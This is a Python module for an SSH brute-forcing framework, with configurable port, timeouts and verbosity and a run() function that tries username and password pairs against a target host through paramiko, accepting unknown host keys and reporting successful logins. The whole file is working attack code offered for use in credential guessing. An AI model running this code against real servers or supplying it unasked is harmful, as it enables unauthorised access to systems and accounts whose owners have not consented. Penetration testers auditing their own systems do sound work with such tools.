import sys,os
sys.path.append(os.getcwd() + "\\..\\misc")
import colors
from socket import socket
try:
    import paramiko
except ModuleNotFoundError:
    colors.PrintColor("FAIL", "Module not Found")
    input()
    
###################
#ABOUT SECTION
###################
name = "ssh broot-forcer"
author = "midnightseer"
version = "1.0"
art = ""
###################
#Executed on Import
###################
banner = '''
                    $$\       
                    $$ |      
 $$$$$$$\  $$$$$$$\ $$$$$$$\  
$$  _____|$$  _____|$$  __$$\ 
\$$$$$$\  \$$$$$$\  $$ |  $$ |
 \____$$\  \____$$\ $$ |  $$ |
$$$$$$$  |$$$$$$$  |$$ |  $$ |
\_______/ \_______/ \__|  \__|
{}
{}
Author:  {}
Version: {}'''.format(art, name, author, version)
print(banner)
###################

#This is an example, you do not necessarily need extra commands
module_cmds = {
}

#This is an example, variables must have a unique name
module_vars = {
    "port": {
        "Name": "Port",
        "Value": 22,
        "Type": 'Integer',
        "Default": "Port 22",
        "Help": "Target the ssh service on port 22",
        "Example": "Port 22"
    },
    "timeout": {
        "Name": "Timeout",
        "Value": 3,
        "Type": 'Integer',
        "Default": "10 seconds",
        "Help": "Amount of seconds for the TCP timeout.",
        "Example": "10 (seconds)"
    }, 
    "banner-timeout": {
        "Name": "Banner-Timeout",
        "Value": 3,
        "Type": 'Integer',
        "Default": "10 seconds",
        "Help": "Amount of seconds to wait for the SSH banner.",
        "Example": "10 (seconds)"
    },
    "allow-hosts": {
        "Name": "Allow-Hosts",
        "Value": True,
        "Type": 'Boolean',
        "Default": True,
        "Help": "Allow unknown hosts to connect to.",
        "Example": "Yes, connect to unknown hosts."
    },
    "verbose": {
        "Name": "Verbose",
        "Value": False,
        "Type": 'Boolean',
        "Default": False,
        "Help": "Print extra messages.",
        "Example": "Print failures and successes.  By default only prints successes."
    }
}


#This function does hte main exection of the brutefore method
def run(username, password, target):
    success = False
    verbose = module_vars['verbose']['Value']
    timeout = module_vars['timeout']['Value']
    port = module_vars['port']['Value']
    banner_timeout = module_vars['banner-timeout']['Value']
    attempt = "Target:{} Username:{} Password:{}".format(target, username, password)

    try:
        client = paramiko.SSHClient()
        if module_vars['allow-hosts']['Value']:  
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        if verbose:
            colors.PrintColor("INFO", "Trying " + attempt)
        client.connect(target, username=username, password=password, timeout=timeout, banner_timeout=banner_timeout, port=port)
        client.close()
        colors.PrintColor("SUCCESS", "Success --> {}".format(attempt))
        success = True
    except paramiko.AuthenticationException:
        if verbose:
            colors.PrintColor("FAIL", "Fail --> {}".format(attempt))
    except paramiko.SSHException as sshException:
        if verbose:    
            colors.PrintColor("FAIL", "Fail --> {} Could not establish SSH connection".format(attempt))
    except Exception as e:
        if verbose:
            colors.PrintColor("FAIL", "Fail --> {} Error! {}".format(attempt, e))
    finally:
        return success
        